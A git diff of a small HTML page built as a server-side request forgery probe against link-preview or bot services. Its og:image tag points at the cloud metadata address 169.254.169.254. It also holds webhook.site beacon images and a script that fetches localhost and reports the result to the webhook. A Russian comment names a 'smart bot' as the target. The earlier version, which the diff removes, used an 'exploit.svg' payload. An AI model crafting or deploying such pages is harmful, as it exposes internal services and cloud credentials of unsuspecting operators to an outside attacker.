@@ -1,11 +1,19 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta property="og:image" content="https://kirayoshikage67.github.io/gfhgfhfhgfhg/exploit.svg">
-    <meta property="twitter:image" content="https://kirayoshikage67.github.io/gfhgfhfhgfhg/exploit.svg">
+    <meta charset="UTF-8">
+    <meta property="og:image" content="http://169.254.169.254/latest/meta-data/">
 </head>
 <body>
-    <img src="https://kirayoshikage67.github.io/gfhgfhfhgfhg/exploit.svg">
-    <img src="https://webhook.site/a792cec2-4ac4-47f4-b6c7-67ac60e6b049/SVG_TRIGGERED">
+    <h1>Processing Image...</h1>
+    
+    <img src="https://webhook.site/a792cec2-4ac4-47f4-b6c7-67ac60e6b049/check_internal">
+
+    <script>
+        // На случай, если зайдет умный бот (MAX)
+        fetch("http://127.0.0.1:80/").catch(e => {
+            new Image().src = "https://webhook.site/a792cec2-4ac4-47f4-b6c7-67ac60e6b049/JS_BLOCKED_LOCAL";
+        });
+    </script>
 </body>
 </html>
